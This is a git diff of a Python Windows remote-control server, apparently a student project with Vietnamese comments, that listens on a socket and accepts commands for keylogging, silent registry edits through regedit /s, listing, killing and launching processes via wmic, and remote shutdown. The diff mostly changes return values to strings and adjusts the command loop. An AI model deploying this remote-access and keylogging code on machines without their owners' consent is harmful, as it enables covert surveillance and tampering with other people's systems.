@@ -2,11 +2,24 @@ import socket
 import os
 import tkinter as tk
 import winreg
+import time
 from io import BytesIO
-from pynput.keyboard import Key, Listener     
+from pynput.keyboard import Key, Listener   
+
+BUFSIZ = 1024
 
 def sendData(sock, msg):
     sock.sendall(bytes(msg, "utf8"))
+
+def receiveData(sock, msg):
+    while True:
+        try:
+            msg = sock.recv(BUFSIZ).decode("utf8")
+        except OSError: 
+            break
+    if (msg == 0):
+        return False
+    return True
 
 def Line(lines):
     if (len(lines) > 0):
@@ -16,7 +29,7 @@ def Line(lines):
         res = res.replace("\n","")
         return res
     else:
-        return "QUIT"
+        return ""
 
 def receive(sock, lines):
     buffer = BytesIO()
@@ -48,7 +61,7 @@ def shutdown(sock):
     try:
         os.system('shutdown /s')
     except OSError:
-        sendData(sock, 0)
+        sendData(sock, "0")
 
 def baseRegistryKey(link):
     a = ""
@@ -73,12 +86,12 @@ def getValue(link, valueName):
     try:
         a = winreg.OpenKey(baseRegistryKey(link), subKey, 0)
     except OSError:
-        return 0
+        return "0"
     try:
         tmp = winreg.QueryValueEx(a, valueName)
         return tmp[0]
     except OSError:
-        return 0
+        return "0"
 
 def setValue(link, valueName, value, typeValue):
     try:
@@ -86,7 +99,7 @@ def setValue(link, valueName, value, typeValue):
         subKey = link[link.index('\\') + 1:len(link)]
         a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
     except OSError:
-        return 0
+        return "0"
     kind = ""
     if (typeValue == "String"):
         kind = winreg.REG_SZ
@@ -101,12 +114,12 @@ def setValue(link, valueName, value, typeValue):
     elif (typeValue == "Expandable String"):
         kind = winreg.REG_EXPAND_SZ
     else:
-        return 0
+        return "0"
     try:
         winreg.SetValueEx(a, valueName, 0, kind, value)
-        return 1
+        return "1"
     except OSError:
-        return 0
+        return "0"
 
 def deleteValue(link, valueName):
     try:
@@ -114,30 +127,30 @@ def deleteValue(link, valueName):
         subKey = link[link.index('\\') + 1:len(link)]
         a = winreg.OpenKey(baseRegistryKey(link), subKey, 0, winreg.KEY_SET_VALUE)
     except OSError:
-        return 0
+        return "0"
     try:
         winreg.DeleteValue(a, valueName)
-        return 1
+        return "1"
     except OSError:
-        return 0
+        return "0"
 
 def deleteKey(link):
     key = baseRegistryKey(link)
     subKey = link[link.index('\\') + 1:len(link)]
     try:
         winreg.DeleteKey(key, subKey)
-        return 1
+        return "1"
     except OSError:
-        return 0
+        return "0"
 
 def createKey(link):
     key = baseRegistryKey(link)
     subKey = link[link.index('\\') + 1:len(link)]
     try:
         winreg.CreateKey(key, subKey)
-        return 1
+        return "1"
     except OSError:
-        return 0
+        return "0"
 
 def registry(sock, lines):
     s = ""
@@ -152,9 +165,9 @@ def registry(sock, lines):
             fin.close()
             try:
                 os.system('wmic process call create \'regedit.exe /s fileReg.reg\'')
-                sendData(sock, 1)
+                sendData(sock, "1")
             except OSError:
-                sendData(sock, 0)
+                sendData(sock, "0")
         elif (s == "SEND"):
             option = receiveLine(sock, lines)
             print(option)
@@ -162,7 +175,7 @@ def registry(sock, lines):
             print(link)
             a = baseRegistryKey(link)
             if (a == ""):
-                s = 0
+                s = "0"
             else:
                 if (option == "Create key"):
                     s = createKey(link)
@@ -180,7 +193,7 @@ def registry(sock, lines):
                     valueName = receiveLine(sock, lines)
                     s = deleteValue(link, valueName)
                 else:
-                    s = 0
+                    s = "0"
             sendData(sock, s)
             #print(s)
         else:
@@ -262,14 +275,14 @@ def process(sock, lines):
                             listID = os.popen('wmic process get ProcessId').read()
                             listID = listID.split('\n')
                             if (id not in listID):
-                                sendData(sock, 0)
+                                sendData(sock, "0")
                                 #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
-                                sendData(sock, 1)
+                                sendData(sock, "1")
                                 #print("Đã diệt process\n")
                         except:
-                            sendData(sock, 0)
+                            sendData(sock, "0")
                             #print("Lỗi\n")  
                 else:
                     test = False
@@ -283,10 +296,10 @@ def process(sock, lines):
                     processName = "\'" + processName + "\'"
                     try:
                         os.system('wmic process call create %s'%(processName))
-                        sendData(sock, 1)
+                        sendData(sock, "1")
                         #print("Process đã được bật\n")
                     except:
-                        sendData(sock, 0)
+                        sendData(sock, "0")
                         #print("Lỗi\n")
                 else:
                     test = False
@@ -312,14 +325,14 @@ def application(sock, lines):
                             listID = os.popen('powershell "gps | where {$_.MainWindowTitle } | select id').read()
                             listID = listID.split('\n')
                             if (id not in listID):
-                                sendData(sock, 0)
+                                sendData(sock, "0")
                                 #print("Lỗi\n")
                             else:
                                 os.system('wmic process where ProcessId=%a delete'%(id))
-                                sendData(sock, 1)
+                                sendData(sock, "1")
                                 #print("Đã diệt chương trình\n")
                         except:
-                            sendData(sock, 0)  
+                            sendData(sock, "0")  
                             #print("Lỗi\n")
                 else:
                     test = False
@@ -333,10 +346,10 @@ def application(sock, lines):
                     appName = "\'" + appName + "\'"
                     try:
                         os.system('wmic process call create %s'%(appName))
-                        sendData(sock, 1)
+                        sendData(sock, "1")
                         #print("Chương trình đã bật\n")
                     except:
-                        sendData(sock, 0)
+                        sendData(sock, "0")
                         #print("Lỗi\n")
                 else:
                     test = False
@@ -353,11 +366,13 @@ def buttonServer_click():
         s.listen()
         conn, addr = s.accept()
         try:
-            #print('Connected by', addr)
+            print('Connected by', addr)
             lines = []
             str = ""
             while True:
+                #time.sleep(1)
                 str = receiveLine(conn, lines)
+                #print(str)
                 if (str == "KEYLOG"):
                     keylog(conn, lines)
                 elif (str == "REGISTRY"):
@@ -370,9 +385,11 @@ def buttonServer_click():
                     process(conn, lines)
                 elif (str == "APPLICATION"):
                     application(conn, lines)
-                else: # str == "QUIT"
+                elif (str == "QUIT"):
                     conn.shutdown(socket.SHUT_RDWR)
                     break
+                else: 
+                    continue
         except KeyboardInterrupt:
             conn.shutdown(socket.SHUT_RDWR)
 
